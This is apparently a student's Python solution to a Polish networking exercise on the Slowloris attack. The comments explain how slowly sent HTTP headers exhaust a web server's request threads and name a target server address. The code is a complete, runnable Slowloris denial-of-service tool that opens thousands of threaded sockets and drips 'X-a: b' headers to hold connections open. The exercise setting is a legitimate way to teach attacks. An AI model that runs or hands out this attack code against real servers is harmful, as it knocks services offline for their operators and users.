# Slowloris, czyli Slow HTTP Headers DoS Attak o nazwie Slowloris, dzięki wykorzystaniu pewnychkoncepcji protokołu HTTP oraz sposobu obsługi żądań serwerów WWW, potrafi całkowicie je sparali-żować w przeciągu kilku sekund. Atak polega na utworzeniu dużej liczby gniazd, a następnie dosyłaniaw powolny sposób danych częściowych żądań HTTP, co w końcu skutkuje wyczerpaniem puli wolnychwątków obsługujących żądania HTTP.

# W klasycznym żądaniu, np. wykorzystującym metodę HTTP GET, do serwera wysyłana jest liniażądania, nagłówki oraz pusta linia CRLF oznaczająca koniec nagłówków. Atak Slowloris polega nawysyłaniu dużej liczby dodatkowych nagłówków, przykładowo X-a: b, które będą sukcesywnie dochodzićdo atakowanego serwera dopiero po pewnym czasie. Podsumowując, atak działa następująco:

# 1. Budowane są gniazda TCP (im więcej, tym lepiej, domyślnie  1000)sock = socket(AF_INET, SOCK_STREAM)
# 2. Następuje podłączenie do serwera i wysyłanie podstawowych nagłówkówsock.connect(server),sock.send(’...’),
# 3. Wysyłany jest nagłówekX-a: b \r\nsock.send(’...’)
# 4. Odczekujemy pewien czas (domyślnie 100 sekund)time.sleep(100)
# 5. Wysyłamy ponownie nagłówekX-a: b \r\nsock.send(’...’)
# 6. Powtarzamy do skutku kroki 4. i 5. dla każdego połączenia, ewentualnie dobudowujemy gniazda dozamkniętych połączeń

# Znając założenia ataku Slowloris, napisz program klienta - atakującego, który wykona atak Slowloris naserwer WWW działający pod adresem212.182.24.27na porcie TCP 8080. Jakich nagłówków HTTPnależy użyć?

import socket
import time
import threading


def slowloris_one_socket(host, port, num_x_a):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
        for _ in range(num_x_a):
            s.send(f"X-a: b\r\n".encode())
            time.sleep(100)


def slowloris_full(host, port, replica):
    # 1000 sockets parallel in treads
    threads = []
    try:
        print("Creating sockets...")
        for _ in range(replica):
            threads.append(threading.Thread(
                target=slowloris_one_socket, args=(host, port, 1000)))
        print("Starting threads...")
        for t in threads:
            t.start()
        print("Joining threads...")
        for t in threads:
            t.join()
        print("Done")
    except KeyboardInterrupt:
        print("Interrupted")
        for t in threads:
            t.join()


if __name__ == "__main__":
    slowloris_full("localhost", 80, 10000)
